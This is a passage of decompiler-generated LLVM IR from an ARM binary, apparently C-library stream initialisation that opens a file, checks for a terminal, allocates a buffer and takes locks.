  %v0_15ba0 = load i32, i32* @r7, align 4
  store i32 %v0_15ba0, i32* %r0.global-to-local, align 4
  store i32 438, i32* @r2, align 4
  %v2_15bac = call i32 @__libc_open(i32 %v0_15ba0, i32 %v0_15ba4)
  store i32 %v2_15bac, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_15bb0 = icmp slt i32 %v2_15bac, 0
  %v1_15bb4 = load i32, i32* @r5, align 4
  %v2_15bb4 = add i32 %v1_15bb4, 4
  %v3_15bb4 = inttoptr i32 %v2_15bb4 to i32*
  store i32 %v2_15bac, i32* %v3_15bb4, align 4
  br i1 %v1_15bb0, label %dec_label_pc_15ac0, label %.dec_label_pc_15bbc_crit_edge

.dec_label_pc_15bbc_crit_edge:                    ; preds = %dec_label_pc_15b98._crit_edge
  %v0_15bc0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15bbc

dec_label_pc_15bbc:                               ; preds = %.dec_label_pc_15bbc_crit_edge, %dec_label_pc_15b8c
  %v0_15bd8 = phi i32 [ %v0_15bc0.pre, %.dec_label_pc_15bbc_crit_edge ], [ %v2_15b90, %dec_label_pc_15b8c ]
  %v0_15bbc = load i32, i32* @r5, align 4
  %v1_15bbc = inttoptr i32 %v0_15bbc to i16*
  %v2_15bbc = load i16, i16* %v1_15bbc, align 2
  %v3_15bbc = zext i16 %v2_15bbc to i32
  %v1_15bc0 = urem i32 %v0_15bd8, 4
  %v1_15bc4 = and i32 %v0_15bd8, 1024
  %v1_15bc8 = and i32 %v3_15bbc, 8192
  %v1_15bcc = add nuw nsw i32 %v1_15bc0, 1
  %v2_15bd0 = or i32 %v1_15bc8, %v1_15bc4
  store i32 %v2_15bd0, i32* %r3.global-to-local, align 4
  %v1_15bd4 = xor i32 %v1_15bcc, 3
  %v1_15bd8 = and i32 %v0_15bd8, 131072
  store i32 %v1_15bd8, i32* %r2.global-to-local, align 4
  %v2_15bd8 = icmp eq i32 %v1_15bd8, 0
  %v1_15bdc = add i32 %v0_15bbc, 4
  %v2_15bdc = inttoptr i32 %v1_15bdc to i32*
  %v3_15bdc = load i32, i32* %v2_15bdc, align 4
  store i32 %v3_15bdc, i32* @r4, align 4
  br i1 %v2_15bd8, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_15bbc
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_15bbc, %bb54
  %v0_15be8 = phi i32 [ 0, %dec_label_pc_15bbc ], [ 32768, %bb54 ]
  %v4_15be4 = mul nuw nsw i32 %v1_15bd4, 16
  %v5_15be4 = or i32 %v2_15bd0, %v4_15be4
  store i32 %v5_15be4, i32* %r3.global-to-local, align 4
  %v2_15be8 = or i32 %v0_15be8, %v5_15be4
  store i32 %v2_15be8, i32* %r2.global-to-local, align 4
  %v2_15bec = icmp ugt i32 %v3_15bdc, 2147483646
  store i1 %v2_15bec, i1* %cpsr_c.global-to-local, align 1
  %v8_15bec = icmp eq i32 %v3_15bdc, 2147483647
  %v1_15bf0 = trunc i32 %v2_15be8 to i16
  store i16 %v1_15bf0, i16* %v1_15bbc, align 2
  br i1 %v8_15bec, label %dec_label_pc_15c30, label %dec_label_pc_15bf8

dec_label_pc_15bf8:                               ; preds = %bb55
  store i32 48704, i32* %r3.global-to-local, align 4
  %v0_15bfc = call i32 @__aeabi_read_tp()
  %v3_15c00 = load i16, i16* @global_var_21a48.352, align 2
  %v4_15c00 = sext i16 %v3_15c00 to i32
  store i32 %v4_15c00, i32* @r3, align 4
  store i32 %v0_15bfc, i32* @r6, align 4
  %v0_15c08 = load i32, i32* @r4, align 4
  store i32 %v0_15c08, i32* @r0, align 4
  %v2_15c0c = add i32 %v4_15c00, %v0_15bfc
  %v3_15c0c = inttoptr i32 %v2_15c0c to i32*
  %v4_15c0c = load i32, i32* %v3_15c0c, align 4
  store i32 %v4_15c0c, i32* @r4, align 4
  %v1_15c10 = call i32 @isatty(i32 %v0_15c08)
  store i32 %v1_15c10, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15c14 = icmp eq i32 %v1_15c10, 0
  br i1 %v2_15c14, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_15bf8
  %v1_15c18 = load i32, i32* @r5, align 4
  %v2_15c18 = inttoptr i32 %v1_15c18 to i16*
  %v3_15c18 = load i16, i16* %v2_15c18, align 2
  %v4_15c18 = zext i16 %v3_15c18 to i32
  %v2_15c1c = or i32 %v4_15c18, 256
  store i32 %v2_15c1c, i32* %r3.global-to-local, align 4
  %v2_15c20 = trunc i32 %v2_15c1c to i16
  store i16 %v2_15c20, i16* %v2_15c18, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_15bf8, %bb56
  %v3_15c28 = load i16, i16* @global_var_21a48.352, align 2
  %v4_15c28 = sext i16 %v3_15c28 to i32
  store i32 %v4_15c28, i32* %r3.global-to-local, align 4
  %v0_15c2c = load i32, i32* @r4, align 4
  %v1_15c2c = load i32, i32* @r6, align 4
  %v3_15c2c = add i32 %v1_15c2c, %v4_15c28
  %v4_15c2c = inttoptr i32 %v3_15c2c to i32*
  store i32 %v0_15c2c, i32* %v4_15c2c, align 4
  br label %dec_label_pc_15c30

dec_label_pc_15c30:                               ; preds = %bb55, %.thread5
  %v0_15c30 = load i32, i32* @r5, align 4
  %v1_15c30 = add i32 %v0_15c30, 8
  %v2_15c30 = inttoptr i32 %v1_15c30 to i32*
  %v3_15c30 = load i32, i32* %v2_15c30, align 4
  store i32 %v3_15c30, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15c34 = icmp eq i32 %v3_15c30, 0
  br i1 %v2_15c34, label %dec_label_pc_15c3c, label %bb57

dec_label_pc_15c3c:                               ; preds = %dec_label_pc_15c30
  store i32 4096, i32* @r0, align 4
  %v0_15c40 = call i32 @malloc()
  store i32 %v0_15c40, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15c44 = icmp eq i32 %v0_15c40, 0
  %v1_15c54.pre = load i32, i32* @r5, align 4
  br i1 %v2_15c44, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_15c3c
  %v2_15c48 = inttoptr i32 %v1_15c54.pre to i16*
  %v3_15c48 = load i16, i16* %v2_15c48, align 2
  %v4_15c48 = zext i16 %v3_15c48 to i32
  %v2_15c4c = add i32 %v0_15c40, 4096
  store i32 %v2_15c4c, i32* %r2.global-to-local, align 4
  %v2_15c50 = or i32 %v4_15c48, 16384
  store i32 %v2_15c50, i32* %r3.global-to-local, align 4
  %v2_15c54 = add i32 %v1_15c54.pre, 8
  %v3_15c54 = inttoptr i32 %v2_15c54 to i32*
  store i32 %v0_15c40, i32* %v3_15c54, align 4
  %v1_15c58 = load i32, i32* %r2.global-to-local, align 4
  %v2_15c58 = load i32, i32* @r5, align 4
  %v3_15c58 = add i32 %v2_15c58, 12
  %v4_15c58 = inttoptr i32 %v3_15c58 to i32*
  store i32 %v1_15c58, i32* %v4_15c58, align 4
  %v1_15c5c = load i32, i32* %r3.global-to-local, align 4
  %v2_15c5c = trunc i32 %v1_15c5c to i16
  %v3_15c5c = load i32, i32* @r5, align 4
  %v4_15c5c = inttoptr i32 %v3_15c5c to i16*
  store i16 %v2_15c5c, i16* %v4_15c5c, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_15c3c
  %v2_15c5437 = add i32 %v1_15c54.pre, 8
  %v3_15c5438 = inttoptr i32 %v2_15c5437 to i32*
  store i32 0, i32* %v3_15c5438, align 4
  %v2_15c60 = load i32, i32* @r5, align 4
  %v3_15c60 = add i32 %v2_15c60, 12
  %v4_15c60 = inttoptr i32 %v3_15c60 to i32*
  store i32 0, i32* %v4_15c60, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %dec_label_pc_15c30, %.thread9
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_15c6c = load i32, i32* @r8, align 4
  %v2_15c6c = add i32 %v0_15c6c, 92
  %v3_15c6c = inttoptr i32 %v2_15c6c to i32*
  %v4_15c6c = load i32, i32* %v3_15c6c, align 4
  store i32 %v4_15c6c, i32* %r3.global-to-local, align 4
  %v2_15c70 = load i32, i32* @r5, align 4
  %v3_15c70 = add i32 %v2_15c70, 2
  %v4_15c70 = inttoptr i32 %v3_15c70 to i8*
  store i8 0, i8* %v4_15c70, align 1
  %v0_15c74 = load i32, i32* @r5, align 4
  %v1_15c74 = inttoptr i32 %v0_15c74 to i16*
  %v2_15c74 = load i16, i16* %v1_15c74, align 2
  %v3_15c74 = zext i16 %v2_15c74 to i32
  store i32 %v3_15c74, i32* %r2.global-to-local, align 4
  %v0_15c78 = load i32, i32* %r3.global-to-local, align 4
  %v1_15c78 = inttoptr i32 %v0_15c78 to i32*
  %v2_15c78 = load i32, i32* %v1_15c78, align 4
  store i32 %v2_15c78, i32* @r1, align 4
  %v1_15c7c = add i32 %v0_15c74, 8
  %v2_15c7c = inttoptr i32 %v1_15c7c to i32*
  %v3_15c7c = load i32, i32* %v2_15c7c, align 4
  store i32 %v3_15c7c, i32* %r3.global-to-local, align 4
  %v1_15c80 = and i32 %v3_15c74, 8192
  %v2_15c80 = icmp eq i32 %v1_15c80, 0
  %v2_15c84 = add i32 %v0_15c74, 20
  %v3_15c84 = inttoptr i32 %v2_15c84 to i32*
  store i32 %v3_15c7c, i32* %v3_15c84, align 4
  %v0_15c88 = load i32, i32* @r1, align 4
  %v1_15c88 = load i32, i32* @r5, align 4
  %v2_15c88 = add i32 %v1_15c88, 52
  %v3_15c88 = inttoptr i32 %v2_15c88 to i32*
  store i32 %v0_15c88, i32* %v3_15c88, align 4
  %v0_15c8c = load i32, i32* %r3.global-to-local, align 4
  %v1_15c8c = load i32, i32* @r5, align 4
  %v2_15c8c = add i32 %v1_15c8c, 24
  %v3_15c8c = inttoptr i32 %v2_15c8c to i32*
  store i32 %v0_15c8c, i32* %v3_15c8c, align 4
  %v0_15c90 = load i32, i32* %r3.global-to-local, align 4
  %v1_15c90 = load i32, i32* @r5, align 4
  %v2_15c90 = add i32 %v1_15c90, 28
  %v3_15c90 = inttoptr i32 %v2_15c90 to i32*
  store i32 %v0_15c90, i32* %v3_15c90, align 4
  %v0_15c94 = load i32, i32* %r3.global-to-local, align 4
  %v1_15c94 = load i32, i32* @r5, align 4
  %v2_15c94 = add i32 %v1_15c94, 16
  %v3_15c94 = inttoptr i32 %v2_15c94 to i32*
  store i32 %v0_15c94, i32* %v3_15c94, align 4
  %v0_15c98 = load i32, i32* %r4.global-to-local, align 4
  %v1_15c98 = load i32, i32* @r5, align 4
  %v2_15c98 = add i32 %v1_15c98, 44
  %v3_15c98 = inttoptr i32 %v2_15c98 to i32*
  store i32 %v0_15c98, i32* %v3_15c98, align 4
  br i1 %v2_15c80, label %dec_label_pc_15e80, label %dec_label_pc_15ca0

dec_label_pc_15ca0:                               ; preds = %bb57
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15ca4 = load i32, i32* @r8, align 4
  %v2_15ca4 = add i32 %v0_15ca4, 160
  %v3_15ca4 = inttoptr i32 %v2_15ca4 to i32*
  %v4_15ca4 = load i32, i32* %v3_15ca4, align 4
  store i32 %v4_15ca4, i32* %r7.global-to-local, align 4
  %v0_15ca8 = call i32 @__aeabi_read_tp()
  store i32 %v0_15ca8, i32* %r0.global-to-local, align 4
  %v1_15cac = add i32 %v4_15ca4, 8
  %v2_15cac = inttoptr i32 %v1_15cac to i32*
  %v3_15cac = load i32, i32* %v2_15cac, align 4
  store i32 %v3_15cac, i32* %r3.global-to-local, align 4
  %v1_15cb0 = add i32 %v0_15ca8, -1168
  store i32 %v1_15cb0, i32* %r6.global-to-local, align 4
  %v3_15cb4 = icmp uge i32 %v3_15cac, %v1_15cb0
  store i1 %v3_15cb4, i1* %cpsr_c.global-to-local, align 1
  %v9_15cb4 = icmp eq i32 %v3_15cac, %v1_15cb0
  br i1 %v9_15cb4, label %dec_label_pc_15cf8, label %dec_label_pc_15cbc

dec_label_pc_15cbc:                               ; preds = %dec_label_pc_15ca0
  store i32 %v4_15ca4, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15cc4

dec_label_pc_15cc4:                               ; preds = %dec_label_pc_15cd0.dec_label_pc_15cc4_crit_edge, %dec_label_pc_15cbc
  %v0_15cc4 = phi i32 [ %v0_15cc4.pre, %dec_label_pc_15cd0.dec_label_pc_15cc4_crit_edge ], [ %v4_15ca4, %dec_label_pc_15cbc ]
  %v1_15cc4 = inttoptr i32 %v0_15cc4 to i32*
  %v2_15cc4 = load i32, i32* %v1_15cc4, align 4
  store i32 %v2_15cc4, i32* %r3.global-to-local, align 4
  %v1_15cc8 = load i32, i32* %r4.global-to-local, align 4
  %v3_15cc8 = icmp uge i32 %v2_15cc4, %v1_15cc8
  store i1 %v3_15cc8, i1* %cpsr_c.global-to-local, align 1
  %v9_15cc8 = icmp eq i32 %v2_15cc4, %v1_15cc8
  br i1 %v9_15cc8, label %dec_label_pc_15cd0, label %dec_label_pc_15ce8

dec_label_pc_15cd0:                               ; preds = %dec_label_pc_15cc4
  store i32 %v2_15cc4, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15ce0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15ce0, label %dec_label_pc_15ce4, label %dec_label_pc_15cd0.dec_label_pc_15cc4_crit_edge

dec_label_pc_15cd0.dec_label_pc_15cc4_crit_edge:  ; preds = %dec_label_pc_15cd0
  %v0_15cc4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15cc4

dec_label_pc_15ce4:                               ; preds = %dec_label_pc_15cd0
  %v0_15ce4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15ce4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15ce8

dec_label_pc_15ce8:                               ; preds = %dec_label_pc_15cc4, %dec_label_pc_15ce4
  %v0_15ce8 = phi i32 [ %v0_15ce4, %dec_label_pc_15ce4 ], [ %v2_15cc4, %dec_label_pc_15cc4 ]
  %v1_15ce8 = phi i32 [ %v0_15ce4, %dec_label_pc_15ce4 ], [ %v1_15cc8, %dec_label_pc_15cc4 ]
  %v3_15ce8 = icmp uge i32 %v0_15ce8, %v1_15ce8
  store i1 %v3_15ce8, i1* %cpsr_c.global-to-local, align 1
  %v9_15ce8 = icmp eq i32 %v0_15ce8, %v1_15ce8
  br i1 %v9_15ce8, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_15ce8
  %v1_15cec = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_15cec, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_15ce8, %bb58
  %v1_15cf0 = xor i1 %v9_15ce8, true
  call void @__pseudo_cond_branch(i1 %v1_15cf0, i32 ptrtoint (i32* @global_var_13f44.513 to i32))
  %v0_15cf4 = load i32, i32* %r6.global-to-local, align 4
  %v1_15cf4 = load i32, i32* %r7.global-to-local, align 4
  %v2_15cf4 = add i32 %v1_15cf4, 8
  %v3_15cf4 = inttoptr i32 %v2_15cf4 to i32*
  store i32 %v0_15cf4, i32* %v3_15cf4, align 4
  %v1_15d14.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15cf8

dec_label_pc_15cf8:                               ; preds = %dec_label_pc_15ca0, %bb59
  %v1_15d14 = phi i32 [ %v3_15cac, %dec_label_pc_15ca0 ], [ %v1_15d14.pre, %bb59 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15cfc = load i32, i32* @r8, align 4
  %v2_15cfc = add i32 %v0_15cfc, 160
  %v3_15cfc = inttoptr i32 %v2_15cfc to i32*
  %v4_15cfc = load i32, i32* %v3_15cfc, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_15d04 = add i32 %v0_15cfc, 152
  %v3_15d04 = inttoptr i32 %v2_15d04 to i32*
  %v4_15d04 = load i32, i32* %v3_15d04, align 4
  store i32 %v4_15d04, i32* %r7.global-to-local, align 4
  %v1_15d08 = add i32 %v4_15cfc, 4
  %v2_15d08 = inttoptr i32 %v1_15d08 to i32*
  %v3_15d08 = load i32, i32* %v2_15d08, align 4
  store i32 %v3_15d08, i32* %r3.global-to-local, align 4
  %v1_15d0c = add i32 %v4_15d04, 8
  %v2_15d0c = inttoptr i32 %v1_15d0c to i32*
  %v3_15d0c = load i32, i32* %v2_15d0c, align 4
  store i32 %v3_15d0c, i32* %r2.global-to-local, align 4
  %v1_15d10 = add i32 %v3_15d08, 1
  store i32 %v1_15d10, i32* %r3.global-to-local, align 4
  %v3_15d14 = icmp uge i32 %v3_15d0c, %v1_15d14
  store i1 %v3_15d14, i1* %cpsr_c.global-to-local, align 1
  %v9_15d14 = icmp eq i32 %v3_15d0c, %v1_15d14
  store i32 %v1_15d10, i32* %v2_15d08, align 4
  br i1 %v9_15d14, label %dec_label_pc_15d60, label %dec_label_pc_15d20

dec_label_pc_15d20:                               ; preds = %dec_label_pc_15cf8
  %v0_15d24 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_15d24, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_15d2c95 = inttoptr i32 %v0_15d24 to i32*
  %v2_15d2c96 = load i32, i32* %v1_15d2c95, align 4
  store i32 %v2_15d2c96, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15d3098 = icmp eq i32 %v2_15d2c96, 0
  br i1 %v9_15d3098, label %dec_label_pc_15d38, label %dec_label_pc_15d50

dec_label_pc_15d38:                               ; preds = %dec_label_pc_15d20, %dec_label_pc_15d38.dec_label_pc_15d2c_crit_edge
  %v0_15d3899 = phi i32 [ %v1_15d30.pre, %dec_label_pc_15d38.dec_label_pc_15d2c_crit_edge ], [ 0, %dec_label_pc_15d20 ]
  store i32 %v0_15d3899, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15d48 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15d48, label %dec_label_pc_15d4c, label %dec_label_pc_15d38.dec_label_pc_15d2c_crit_edge

dec_label_pc_15d38.dec_label_pc_15d2c_crit_edge:  ; preds = %dec_label_pc_15d38
  %v0_15d2c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15d30.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15d2c = inttoptr i32 %v0_15d2c.pre to i32*
  %v2_15d2c = load i32, i32* %v1_15d2c, align 4
  store i32 %v2_15d2c, i32* %r3.global-to-local, align 4
  %v3_15d30 = icmp uge i32 %v2_15d2c, %v1_15d30.pre
  store i1 %v3_15d30, i1* %cpsr_c.global-to-local, align 1
  %v9_15d30 = icmp eq i32 %v2_15d2c, %v1_15d30.pre
  br i1 %v9_15d30, label %dec_label_pc_15d38, label %dec_label_pc_15d50

dec_label_pc_15d4c:                               ; preds = %dec_label_pc_15d38
  %v0_15d4c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15d4c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15d50

dec_label_pc_15d50:                               ; preds = %dec_label_pc_15d20, %dec_label_pc_15d38.dec_label_pc_15d2c_crit_edge, %dec_label_pc_15d4c
  %v0_15d50 = phi i32 [ %v0_15d4c, %dec_label_pc_15d4c ], [ %v2_15d2c96, %dec_label_pc_15d20 ], [ %v2_15d2c, %dec_label_pc_15d38.dec_label_pc_15d2c_crit_edge ]
  %v1_15d50 = phi i32 [ %v0_15d4c, %dec_label_pc_15d4c ], [ 0, %dec_label_pc_15d20 ], [ %v1_15d30.pre, %dec_label_pc_15d38.dec_label_pc_15d2c_crit_edge ]
  %v3_15d50 = icmp uge i32 %v0_15d50, %v1_15d50
  store i1 %v3_15d50, i1* %cpsr_c.global-to-local, align 1
  %v9_15d50 = icmp eq i32 %v0_15d50, %v1_15d50
  br i1 %v9_15d50, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_15d50
  %v1_15d54 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_15d54, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_15d50, %bb60
  %v1_15d58 = xor i1 %v9_15d50, true
  call void @__pseudo_cond_branch(i1 %v1_15d58, i32 ptrtoint (i32* @global_var_13f44.513 to i32))
  %v0_15d5c = load i32, i32* %r6.global-to-local, align 4
  %v1_15d5c = load i32, i32* %r7.global-to-local, align 4
  %v2_15d5c = add i32 %v1_15d5c, 8
  %v3_15d5c = inttoptr i32 %v2_15d5c to i32*
  store i32 %v0_15d5c, i32* %v3_15d5c, align 4
  br label %dec_label_pc_15d60

dec_label_pc_15d60:                               ; preds = %dec_label_pc_15cf8, %bb61
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_15d64 = load i32, i32* @r8, align 4
  %v2_15d64 = add i32 %v0_15d64, 152
  %v3_15d64 = inttoptr i32 %v2_15d64 to i32*
  %v4_15d64 = load i32, i32* %v3_15d64, align 4
  store i32 %v4_15d64, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_15d6c = add i32 %v0_15d64, 76
  %v3_15d6c = inttoptr i32 %v2_15d6c to i32*
  %v4_15d6c = load i32, i32* %v3_15d6c, align 4
  store i32 %v4_15d6c, i32* @r1, align 4
  %v1_15d70 = add i32 %v4_15d64, 4
  %v2_15d70 = inttoptr i32 %v1_15d70 to i32*
  %v3_15d70 = load i32, i32* %v2_15d70, align 4
  store i32 %v3_15d70, i32* %r3.global-to-local, align 4
  %v1_15d74 = inttoptr i32 %v4_15d6c to i32*
  %v2_15d74 = load i32, i32* %v1_15d74, align 4
  store i32 %v2_15d74, i32* %r2.global-to-local, align 4
  %v1_15d78 = add i32 %v3_15d70, 1
  store i32 %v1_15d78, i32* %r3.global-to-local, align 4
  store i32 %v1_15d78, i32* %v2_15d70, align 4
  %v0_15d80 = load i32, i32* %r2.global-to-local, align 4
  %v1_15d80 = load i32, i32* @r5, align 4
  %v2_15d80 = add i32 %v1_15d80, 32
  %v3_15d80 = inttoptr i32 %v2_15d80 to i32*
  store i32 %v0_15d80, i32* %v3_15d80, align 4
  %v0_15d84 = load i32, i32* %r0.global-to-local, align 4
  %v1_15d84 = add i32 %v0_15d84, 4
  %v2_15d84 = inttoptr i32 %v1_15d84 to i32*
  %v3_15d84 = load i32, i32* %v2_15d84, align 4
  %v1_15d88 = add i32 %v3_15d84, -1
  store i32 %v1_15d88, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d8c = icmp eq i32 %v1_15d88, 0
  %v0_15d90 = load i32, i32* @r5, align 4
  %v1_15d90 = load i32, i32* @r1, align 4
  %v2_15d90 = inttoptr i32 %v1_15d90 to i32*
  store i32 %v0_15d90, i32* %v2_15d90, align 4
  %v0_15d94 = load i32, i32* %r3.global-to-local, align 4
  %v1_15d94 = load i32, i32* %r0.global-to-local, align 4
  %v2_15d94 = add i32 %v1_15d94, 4
  %v3_15d94 = inttoptr i32 %v2_15d94 to i32*
  store i32 %v0_15d94, i32* %v3_15d94, align 4
  br i1 %v2_15d8c, label %dec_label_pc_15d9c, label %dec_label_pc_15dfc

dec_label_pc_15d9c:                               ; preds = %dec_label_pc_15d60
  %v0_15d9c = load i32, i32* %r3.global-to-local, align 4
  %v1_15d9c = load i32, i32* %r0.global-to-local, align 4
  %v2_15d9c = add i32 %v1_15d9c, 8
  %v3_15d9c = inttoptr i32 %v2_15d9c to i32*
  store i32 %v0_15d9c, i32* %v3_15d9c, align 4
  %v0_15da0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15da0, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15da4

dec_label_pc_15da4:                               ; preds = %dec_label_pc_15dd4.dec_label_pc_15da4_crit_edge, %dec_label_pc_15d9c
  %v0_15da4 = phi i32 [ %v0_15da4.pre, %dec_label_pc_15dd4.dec_label_pc_15da4_crit_edge ], [ %v0_15da0, %dec_label_pc_15d9c ]
  %v1_15da4 = inttoptr i32 %v0_15da4 to i32*
  %v2_15da4 = load i32, i32* %v1_15da4, align 4
  store i32 %v2_15da4, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_15da4, i32* %r2.global-to-local, align 4
  %v2_15db083 = load i32, i32* %v1_15da4, align 4
  store i32 %v2_15db083, i32* %r3.global-to-local, align 4
  %v3_15db485 = icmp uge i32 %v2_15db083, %v2_15da4
  store i1 %v3_15db485, i1* %cpsr_c.global-to-local, align 1
  %v9_15db491 = icmp eq i32 %v2_15db083, %v2_15da4
  br i1 %v9_15db491, label %dec_label_pc_15dbc, label %dec_label_pc_15dd4

dec_label_pc_15dbc:                               ; preds = %dec_label_pc_15da4, %dec_label_pc_15dbc.dec_label_pc_15db0_crit_edge
  %v0_15dbc92 = phi i32 [ %v1_15db4.pre, %dec_label_pc_15dbc.dec_label_pc_15db0_crit_edge ], [ %v2_15da4, %dec_label_pc_15da4 ]
  store i32 %v0_15dbc92, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15dcc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15dcc, label %dec_label_pc_15dd0, label %dec_label_pc_15dbc.dec_label_pc_15db0_crit_edge

dec_label_pc_15dbc.dec_label_pc_15db0_crit_edge:  ; preds = %dec_label_pc_15dbc
  %v0_15db0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15db4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15db0 = inttoptr i32 %v0_15db0.pre to i32*
  %v2_15db0 = load i32, i32* %v1_15db0, align 4
  store i32 %v2_15db0, i32* %r3.global-to-local, align 4
  %v3_15db4 = icmp uge i32 %v2_15db0, %v1_15db4.pre
  store i1 %v3_15db4, i1* %cpsr_c.global-to-local, align 1
  %v9_15db4 = icmp eq i32 %v2_15db0, %v1_15db4.pre
  br i1 %v9_15db4, label %dec_label_pc_15dbc, label %dec_label_pc_15dd4

dec_label_pc_15dd0:                               ; preds = %dec_label_pc_15dbc
  %v0_15dd0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15dd0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15dd4

dec_label_pc_15dd4:                               ; preds = %dec_label_pc_15da4, %dec_label_pc_15dbc.dec_label_pc_15db0_crit_edge, %dec_label_pc_15dd0
  %v0_15ddc = phi i32 [ %v0_15dd0, %dec_label_pc_15dd0 ], [ %v2_15db083, %dec_label_pc_15da4 ], [ %v2_15db0, %dec_label_pc_15dbc.dec_label_pc_15db0_crit_edge ]
  %v1_15dd4 = phi i32 [ %v0_15dd0, %dec_label_pc_15dd0 ], [ %v2_15da4, %dec_label_pc_15da4 ], [ %v1_15db4.pre, %dec_label_pc_15dbc.dec_label_pc_15db0_crit_edge ]
  %v3_15dd4 = icmp uge i32 %v0_15ddc, %v1_15dd4
  store i1 %v3_15dd4, i1* %cpsr_c.global-to-local, align 1
  %v9_15dd4 = icmp eq i32 %v0_15ddc, %v1_15dd4
  br i1 %v9_15dd4, label %dec_label_pc_15ddc, label %dec_label_pc_15dd4.dec_label_pc_15da4_crit_edge

dec_label_pc_15dd4.dec_label_pc_15da4_crit_edge:  ; preds = %dec_label_pc_15dd4
  %v0_15da4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15da4

dec_label_pc_15ddc:                               ; preds = %dec_label_pc_15dd4
  %v2_15ddc = icmp ne i32 %v1_15dd4, 0
  store i1 %v2_15ddc, i1* %cpsr_c.global-to-local, align 1
  %v7_15de0 = icmp slt i32 %v1_15dd4, 2
  br i1 %v7_15de0, label %dec_label_pc_15dfc, label %dec_label_pc_15de4

dec_label_pc_15de4:                               ; preds = %dec_label_pc_15ddc
  %v0_15de4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_15de4, i32* %r0.global-to-local, align 4
  %v0_15de8 = load i32, i32* @r1, align 4
  %v1_15de8 = add i32 %v0_15de8, 129
  store i32 %v1_15de8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15dfc

dec_label_pc_15dfc:                               ; preds = %dec_label_pc_15d60, %dec_label_pc_15de4, %dec_label_pc_15ddc
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15e00 = load i32, i32* @r8, align 4
  %v2_15e00 = add i32 %v0_15e00, 160
  %v3_15e00 = inttoptr i32 %v2_15e00 to i32*
  %v4_15e00 = load i32, i32* %v3_15e00, align 4
  store i32 %v4_15e00, i32* %r0.global-to-local, align 4
  %v1_15e04 = add i32 %v4_15e00, 4
  %v2_15e04 = inttoptr i32 %v1_15e04 to i32*
  %v3_15e04 = load i32, i32* %v2_15e04, align 4
  %v1_15e08 = add i32 %v3_15e04, -1
  store i32 %v1_15e08, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15e0c = icmp eq i32 %v1_15e08, 0
  store i32 %v1_15e08, i32* %v2_15e04, align 4
  br i1 %v2_15e0c, label %dec_label_pc_15e18, label %dec_label_pc_15e80

dec_label_pc_15e18:                               ; preds = %dec_label_pc_15dfc
  %v0_15e18 = load i32, i32* %r3.global-to-local, align 4
